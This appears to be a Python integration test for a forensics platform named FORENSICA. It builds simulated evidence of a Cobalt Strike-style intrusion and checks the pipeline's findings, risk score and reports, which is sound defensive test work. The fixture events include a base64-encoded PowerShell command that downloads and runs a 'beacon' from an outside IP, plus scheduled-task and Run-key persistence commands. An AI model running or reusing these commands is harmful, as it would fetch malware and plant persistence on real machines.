# test_platform.py
# Integration Test Suite for FORENSICA Platform

import os
import shutil
import json
import hashlib
import csv
from orchestrator import build_pipeline
from state import DFIRState
from db_helper import DatabaseHelper

TEST_DIR = "simulated_evidence"

def setup_simulated_evidence():
    print("[TestSetup] Generating simulated forensic evidence package...")
    if os.path.exists(TEST_DIR):
        shutil.rmtree(TEST_DIR)
    os.makedirs(TEST_DIR)

    # 1. Metadata
    meta = {
        "case_id": "CASE-TEST-001",
        "hostname": "SEC-WORKSTATION",
        "username": "analyst_bob",
        "timestamp": "2026-06-09T18:00:00Z"
    }
    with open(os.path.join(TEST_DIR, "case_meta.json"), "w") as f:
        json.dump(meta, f, indent=2)

    # 2. EVTX Events (Cobalt Strike intrusion sequence)
    events = [
        # Phishing open
        {
            "timestamp": "2026-06-09T18:05:00Z",
            "hostname": "SEC-WORKSTATION",
            "username": "analyst_bob",
            "event_type": "Process",
            "event_id": 4688,
            "process": "winword.exe",
            "pid": 3812,
            "CommandLine": "C:\\Program Files\\Microsoft Office\\Office16\\winword.exe /n C:\\Users\\Public\\invoice.docx",
            "ParentProcessName": "explorer.exe",
            "ParentProcessId": 1200
        },
        # Shell spawn from Office Macro
        {
            "timestamp": "2026-06-09T18:05:05Z",
            "hostname": "SEC-WORKSTATION",
            "username": "analyst_bob",
            "event_type": "Process",
            "event_id": 4688,
            "process": "powershell.exe",
            "pid": 4821,
            "CommandLine": "powershell.exe -nop -w hidden -enc aWV4IChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vMTg1LjIyMC4xMDEuNDcvYmVhY29uJykuLi4=",
            "ParentProcessName": "C:\\Program Files\\Microsoft Office\\Office16\\winword.exe",
            "ParentProcessId": 3812
        },
        # Outbound C2 connection log
        {
            "timestamp": "2026-06-09T18:05:10Z",
            "hostname": "SEC-WORKSTATION",
            "username": "system",
            "event_type": "Network",
            "event_id": 3,
            "process": "powershell.exe",
            "pid": 4821,
            "CommandLine": "powershell.exe",
            "NewProcessName": "powershell.exe",
            "NewProcessId": 4821,
            "DestinationPort": 443,
            "DestinationIp": "185.220.101.47"
        },
        # Scheduled task persistence
        {
            "timestamp": "2026-06-09T18:10:00Z",
            "hostname": "SEC-WORKSTATION",
            "username": "system",
            "event_type": "Process",
            "event_id": 4688,
            "process": "schtasks.exe",
            "pid": 5012,
            "CommandLine": "schtasks /create /tn 'UpdateManagerTask' /tr 'C:\\Users\\Public\\svchost32.exe' /sc daily",
            "ParentProcessName": "cmd.exe",
            "ParentProcessId": 4821
        }
    ]
    with open(os.path.join(TEST_DIR, "evtx_events.json"), "w") as f:
        json.dump(events, f, indent=2)

    # 3. Prefetch records
    prefetch = [
        {"process": "POWERSHELL.EXE", "last_run": "2026-06-09T18:05:05Z", "run_count": 14},
        {"process": "SCHTASKS.EXE", "last_run": "2026-06-09T18:10:00Z", "run_count": 3}
    ]
    with open(os.path.join(TEST_DIR, "prefetch_records.json"), "w") as f:
        json.dump(prefetch, f, indent=2)

    # 4. Registry keys
    registry = [
        {"key": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "value": "Updater", "data": "C:\\Users\\Public\\svchost32.exe", "last_write": "2026-06-09T18:09:00Z"}
    ]
    with open(os.path.join(TEST_DIR, "registry_keys.json"), "w") as f:
        json.dump(registry, f, indent=2)

    # 5. Volatility memory findings
    memory = [
        {"plugin": "windows.pslist", "process": "powershell.exe", "pid": 4821, "ppid": 3812, "timestamp": "2026-06-09T18:05:05Z"},
        {"plugin": "windows.netscan", "pid": 4821, "local_ip": "192.168.1.105", "local_port": 49201, "remote_ip": "185.220.101.47", "port": 443, "proto": "TCP", "state": "ESTABLISHED"}
    ]
    with open(os.path.join(TEST_DIR, "memory_findings.json"), "w") as f:
        json.dump(memory, f, indent=2)

    # 6. Generate cryptographic manifest hashes
    files_to_hash = ["case_meta.json", "evtx_events.json", "prefetch_records.json", "registry_keys.json", "memory_findings.json"]
    manifest_rows = []
    for file_name in files_to_hash:
        file_path = os.path.join(TEST_DIR, file_name)
        sha256_hash = hashlib.sha256()
        with open(file_path, "rb") as bf:
            for byte_block in iter(lambda: bf.read(4096), b""):
                sha256_hash.update(byte_block)
        manifest_rows.append({"file_name": file_name, "sha256": sha256_hash.hexdigest()})

    with open(os.path.join(TEST_DIR, "artifact_manifest.csv"), mode="w", newline="") as f:
        writer = csv.DictWriter(f, fieldnames=["file_name", "sha256"])
        writer.writeheader()
        writer.writerows(manifest_rows)

    print("[TestSetup] Evidence package setup complete.")

def run_integration_test():
    # Setup
    setup_simulated_evidence()

    # Compile the LangGraph pipeline
    print("\n[TestExecutor] Building multi-agent graph...")
    pipeline = build_pipeline()

    # Create initial state
    state = DFIRState(
        case_id="CASE-TEST-001",
        evidence_path=TEST_DIR
    )

    # Invoke pipeline
    print("[TestExecutor] Invoking FORENSICA multi-agent swarm graph...")
    final_state = pipeline.invoke(state)

    print("\n[TestExecutor] Pipeline execution completed. Running verification assertions...")

    # 1. Assertions on Database Population
    db = DatabaseHelper()
    
    # Assert Events are in DB
    events = db.get_events("CASE-TEST-001")
    assert len(events) > 0, "No event logs found in database."
    print(f"[Assert Passed] Event log records inserted successfully ({len(events)} rows).")

    # Assert findings are in DB
    findings = db.get_findings("CASE-TEST-001")
    assert len(findings) > 0, "No findings registered in database."
    print(f"[Assert Passed] Verified findings inserted successfully ({len(findings)} rows).")

    # Assert IOCs are in DB
    iocs = db.get_iocs("CASE-TEST-001")
    assert len(iocs) > 0, "No defanged IOCs registered in database."
    print(f"[Assert Passed] IOC lists mapped and stored successfully ({len(iocs)} rows).")

    # 2. Assertions on State variables
    assert final_state["risk_score"] >= 96, f"Risk score calculation error: expected >= 96, got {final_state['risk_score']}"
    print(f"[Assert Passed] Joint Bayesian Compromise Probability correctly calculated as {final_state['risk_score']}%.")

    assert len(final_state["containment_playbooks"]) > 0, "Playbook isolation scripts not generated."
    print(f"[Assert Passed] Containment playbook created ({len(final_state['containment_playbooks'])} commands queued).")

    assert final_state["report_executive"] != "", "Executive Brief report is empty."
    assert final_state["report_soc"] != "", "SOC Report is empty."
    assert final_state["report_remediation"] != "", "Remediation report is empty."
    print("[Assert Passed] Narrative Markdown reports compiled successfully.")

    # Print Report Previews
    print("\n================== EXECUTIVE INCIDENT BRIEF ==================")
    print(final_state["report_executive"][:500] + "\n...")
    print("===============================================================")
    
    print("\n======================= ACTION PLAYBOOK =======================")
    print(final_state["report_remediation"][:500] + "\n...")
    print("===============================================================")


    # Cleanup test directory
    shutil.rmtree(TEST_DIR)
    
    # Remove sqlite db generated
    if os.path.exists("forensica.db"):
        os.remove("forensica.db")
        print("[TestCleanup] Removed temporary database file.")

    print("\n[TEST SUCCESS] All FORENSICA swarm platform components validated successfully!")

if __name__ == "__main__":
    run_integration_test()
